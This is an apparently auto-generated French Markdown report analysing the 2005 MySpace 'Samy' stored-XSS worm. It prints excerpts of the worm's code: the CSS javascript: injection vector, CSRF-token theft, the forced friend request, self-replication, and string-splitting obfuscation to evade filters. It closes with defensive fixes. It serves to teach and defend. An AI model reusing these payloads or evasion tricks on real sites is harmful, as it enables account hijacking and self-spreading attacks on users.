---
title: Analyse du ver MySpace "Samy" — Rapport
author: Analyse automatique
date: 2025-11-01
---

# Analyse du ver MySpace « Samy » — Résumé

Ce rapport présente une synthèse technique du ver « Samy » qui a infecté des profils MySpace en exploitant une vulnérabilité de type Cross-Site Scripting (XSS) stocké via CSS. Le contenu ci‑dessous est une mise en forme Markdown à partir d'une analyse technique existante.

## Table des matières

- [1. Nature de la faille](#1-nature-de-la-faille)
- [2. Comportement du code](#2-comportement-du-code)
- [3. Mécanisme de propagation](#3-m%C3%A9canisme-de-propagation)
- [4. Raisons de la persistance du code](#4-raisons-de-la-persistance-du-code)
- [5. Impact et rythme de propagation](#5-impact-et-rythme-de-propagation)
- [6. Remarques finales](#6-remarques-finales)

---

## 1. Nature de la faille

- **Faille** : Cross-Site Scripting (XSS) stocké via CSS
- **Nature** : Injection de code JavaScript malveillant dans un champ de profil utilisateur (section « heroes ») stocké en base de données et exécuté dans le navigateur des visiteurs.

### Ligne vulnérable (exemple)

```html
<div id=mycode style="BACKGROUND: url('javascript:eval(document.all.mycode.expr)')">
```

### Explication technique

- MySpace filtrait explicitement les balises `<script>`, les attributs `onClick` et le mot-clé `javascript`.
- Cependant, MySpace autorisait les balises `<div>` et l'attribut `style`.
- Certains navigateurs (notamment Internet Explorer et Safari à l'époque) interprétaient des valeurs CSS de type `background:url(...)` contenant `javascript:` comme exécution de code JS.
- Pour contourner le filtrage du mot `javascript`, l'attaquant a fragmenté le mot (ex. `java` + retour ligne + `script`) — certains navigateurs recomposaient cette valeur et l'exécutaient.

> En pratique, la validation côté serveur a été contournée en profitant des différences d'interprétation entre navigateurs.

---

## 2. Que fait le code ?

Lorsque le profil infecté est visité, le code effectue automatiquement plusieurs actions :

1. Vol d'identité de session

```js
var L = AS['Mytoken'];  // récupère le token
var M = AS['friendID']; // récupère l'ID de l'utilisateur
```

Le ver extrait les tokens CSRF et l'identifiant de l'utilisateur depuis la page ou l'URL.

2. Ajout automatique comme ami

```js
AS['friendID'] = '11851658'; // ID de Samy
AS['submit'] = 'Add to Friends';
httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR)
```

Le ver envoie une requête pour ajouter automatiquement Samy comme ami au nom de la victime.

3. Modification du profil

```js
AF = ' but most of all, samy is my hero. <div id='+AE+'DIV>'
AS['interest'] = AG; // contient le texte + le code du ver
```

Le ver insère le message « but most of all, samy is my hero » dans la section « heroes » du profil, suivi du code du ver.

4. Auto-réplication (propagation)

```js
var AA = g(); // récupère le code source de la page
var AB = AA.indexOf('mycode');
var AC = AA.substring(AB, AB+4096);
var AD = AC.indexOf('DIV');
var AE = AC.substring(0, AD);
// AE contient alors le code du ver à réinsérer
```

Le ver s'extrait lui-même depuis le HTML de la page infectée et l'injecte dans les profils des victimes.

---

## 3. Mécanisme de propagation du code

Le mécanisme est exponentiel et automatique. Les grandes étapes :

1. Extraction du code source (fonction g)

```js
function g(){
    var C;
    try{
        var D = document.body.createTextRange();
        C = D.htmlText
    }catch(e){}
    return C || eval('document.body.inne'+'rHTML')
}
```

2. Isolation du bloc contenant le ver (recherche de `mycode`, extraction de ~4 KB)

3. Réplication : le ver reconstruit une portion du profil infecté (message + bloc `div`) et la poste dans le profil de la victime.

4. Déclenchement : à chaque visite d'un profil infecté, le code s'exécute et infecte potentiellement plus de profils.

---

## 4. Pourquoi le code a-t-il survécu ?

Plusieurs facteurs combinés ont permis au ver de rester actif suffisamment longtemps pour causer un énorme impact :

- Obfuscation et fragmentation du code

```js
var B = String.fromCharCode(34);
var A = String.fromCharCode(39);
eval('document.body.inne'+'rHTML')
findIn(g(),'m'+'ycode')
```

Ces techniques évitaient la détection automatique par des signatures simples.

- Exploitation des différences d'interprétation entre navigateurs (IE/Safari vs Firefox/Opera)

- Contournement des protections MySpace (filtrage, limitation XMLHTTP, vérifications CSRF partiellement contournées)

- Stockage permanent dans la base de données : le XSS était stocké dans chaque profil infecté, rendant l'infection persistante jusqu'à nettoyage manuel.

---

## 5. Impact et rythme de propagation

- Rapporté : ~1 million d'utilisateurs infectés en ~20 heures.
- Le modèle de propagation est exponentiel — chaque victime pouvait infecter tous ses visiteurs.

Ces chiffres montrent l'importance d'une validation stricte des entrées, d'une normalisation côté serveur et d'une prise en compte des différences d'interprétation entre navigateurs.

---

## 6. Remarques finales

- Correctifs recommandés :
  - Échapper correctement le contenu utilisateur avant stockage et rendu (encodage HTML/CSS),
  - Bloquer totalement les valeurs `javascript:` dans les URLs/attributs de style,
  - Appliquer une politique de Content Security Policy (CSP) pertinente,
  - Valider côté serveur et normaliser les entrées côté client.

- Ce document est une mise en forme Markdown d'une analyse existante extraite du script `samy_analysis_to_pdf.py`.

---

### Sources et notes

- Extrait d'une analyse technique fournie dans le dépôt (voir `samy_analysis_to_pdf.py`).
- Date de génération : 2025-11-01

---

_Fin du rapport._
